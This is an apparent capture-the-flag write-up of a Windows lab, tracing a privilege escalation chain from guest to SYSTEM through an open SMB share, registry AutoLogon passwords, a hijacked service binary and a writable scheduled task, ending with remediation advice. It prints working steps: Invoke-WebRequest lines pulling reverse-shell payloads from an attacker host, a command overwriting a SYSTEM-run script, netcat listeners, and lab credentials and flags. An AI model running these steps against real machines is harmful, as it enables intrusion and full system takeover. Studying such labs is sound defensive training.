# PRIVESC — Windows Privilege Escalation Chain Writeup

**Target:** `10.48.169.231` (hostname: `PRIVESC`, Windows Server 2019 build 17763)
**Objective:** Escalate through `guest → thmuser → notadmin → svcadmin → SYSTEM`

---

## Flags Captured

| Flag | Value | Location |
|------|-------|----------|
| Flag 1 | `THM{5mb_cr3d5_1n_th3_5h4r3}` | `Public` SMB share — `welcome.txt` |
| Flag 2 | `THM{w1nl0g0n_cr3ds_3xp0s3d}` | `C:\Users\notadmin\Desktop\flag2.txt` |
| Flag 3 | `THM{s3rv1c3_b1n4ry_h1j4ck3d}` | `C:\Users\svcadmin\Desktop\flag3.txt` |
| Flag 4 | `THM{t4sk_wr1t3_t0_SYST3M}` | `C:\flag4.txt` |

---

## 1. Recon

```bash
nmap -sC -sV -T4 10.48.169.231
```

Key open ports:

| Port | Service | Notes |
|------|---------|-------|
| 135  | msrpc   | |
| 139/445 | SMB  | Message signing enabled but not required |
| 3389 | RDP     | Host: `PRIVESC` |
| 5985 | WinRM   | Enables remote PowerShell access |

---

## 2. Guest → thmuser (Anonymous SMB access)

An anonymous/null SMB session was allowed against a `Public` share:

```bash
smbclient //10.48.169.231/Public -N
```

Inside the share was a `welcome.txt` file left behind by IT with default onboarding credentials:

```
Welcome to CORP-NET.
New employee default credentials
================================
Username : thmuser
Password : Password1!
```

**Root cause:** Guest/anonymous SMB access to a share containing plaintext credentials.

**Flag 1:** `THM{5mb_cr3d5_1n_th3_5h4r3}` — `Public` share, `welcome.txt`

---

## 3. thmuser → notadmin (AutoLogon credentials in the registry)

Authenticated as `thmuser` via WinRM:

```bash
evil-winrm -i 10.48.169.231 -u thmuser -p 'Password1!'
```

Enumeration of the registry revealed AutoAdminLogon credentials stored in cleartext:

```powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

```
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    P@ssw0rd!
```

**Root cause:** Auto-login configured for convenience, storing the next account's password in plaintext in a registry key readable by any local user.

**Flag 2:** `THM{w1nl0g0n_cr3ds_3xp0s3d}` — `C:\Users\notadmin\Desktop\flag2.txt`

---

## 4. notadmin → svcadmin (Service binary hijack)

Logged in as `notadmin` and enumerated services, focusing on non-Microsoft binaries:

```powershell
Get-CimInstance Win32_Service | Where-Object {$_.StartName -like "*svcadmin*"} | Select Name, PathName, StartName
```

```
Name    PathName                    StartName
----    --------                    ---------
THMSvc  C:\Windows\THMSVC\svc.exe   .\svcadmin
```

The `THMSvc` service ran as `svcadmin`, and its binary directory (`C:\Windows\THMSVC\`) was writable by low-privileged users. A reverse-shell payload was generated with `msfvenom`, hosted via a Python HTTP server on the attacking box, and pulled onto the target:

```powershell
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/svc.exe -OutFile C:\Windows\THMSVC\svc.exe
```

The service was then (re)started to execute the payload as `svcadmin`:

```cmd
sc start THMSvc
```

A listener on the attacker box caught the resulting shell:

```bash
nc -lvp 4445
```

```
C:\Windows\system32>whoami
privesc\svcadmin
```

**Root cause:** Weak filesystem ACLs on a custom service's install directory allowed any authenticated user to overwrite the service executable — classic service binary hijacking.

**Flag 3:** `THM{s3rv1c3_b1n4ry_h1j4ck3d}` — `C:\Users\svcadmin\Desktop\flag3.txt`

---

## 5. svcadmin → SYSTEM (Writable Scheduled Task in `C:\Windows\Tasks`)

As `svcadmin`, `C:\Windows\Tasks` contained a legacy scheduled task script, `cleanup.bat`:

```powershell
icacls C:\Windows\Tasks\cleanup.bat
```

```
BUILTIN\Users:(I)(RX)
PRIVESC\svcadmin:(I)(M)         <-- Modify access
BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
```

`svcadmin` had **Modify** rights on a script that runs on a schedule under the SYSTEM context. A reverse-shell binary was uploaded and the batch file was overwritten to execute it:

```powershell
Invoke-WebRequest -Uri http://<ATTACKER_IP>:9999/shell3.exe -OutFile C:\Windows\Tasks\shell3.exe
cmd /c "echo C:\Windows\Tasks\shell3.exe > C:\Windows\Tasks\cleanup.bat"
```

When the scheduled task fired, the attacker's listener received a SYSTEM shell:

```bash
nc -lvp 7777
```

```
C:\Windows\system32>whoami
nt authority\system
```

**Root cause:** A legacy/forgotten scheduled task script had loose file ACLs (`Modify` for a low-privileged service account) while still executing in the SYSTEM context — a classic "write access to a SYSTEM-run script" privesc.

**Flag 4:** `THM{t4sk_wr1t3_t0_SYST3M}` — `C:\flag4.txt`

---

## Summary of the Chain

| Stage | Technique | Root Cause |
|-------|-----------|------------|
| guest → thmuser | Anonymous SMB share read | Credentials left in a plaintext file on an open share |
| thmuser → notadmin | Registry credential exposure | AutoAdminLogon storing plaintext password in `HKLM\...\Winlogon` |
| notadmin → svcadmin | Service binary hijack | Writable directory for a custom service (`THMSvc`) running as `svcadmin` |
| svcadmin → SYSTEM | Scheduled task hijack | Writable script (`cleanup.bat`) in `C:\Windows\Tasks` executed by SYSTEM |

## Remediation Recommendations

1. Disable anonymous/guest access to SMB shares; audit all shares for sensitive files.
2. Never use `AutoAdminLogon` with plaintext `DefaultPassword` in the registry — use alternative secure authentication or Credential Guard.
3. Enforce least-privilege ACLs on service binaries and their containing directories; only `TrustedInstaller`/`SYSTEM`/`Administrators` should have write access.
4. Regularly audit `C:\Windows\Tasks`, Task Scheduler entries, and any SYSTEM-context automation scripts for excessive write permissions granted to non-admin accounts.
5. Follow proper offboarding/decommissioning procedures for machines left behind after layoffs — this entire chain existed because of accumulated, uncleaned misconfigurations on an abandoned workstation.

---

*Tools used: `nmap`, `smbclient`, `smbmap`, `evil-winrm`, PowerShell, `msfvenom`, `netcat`, `icacls`, `reg query`, `Get-CimInstance`.*
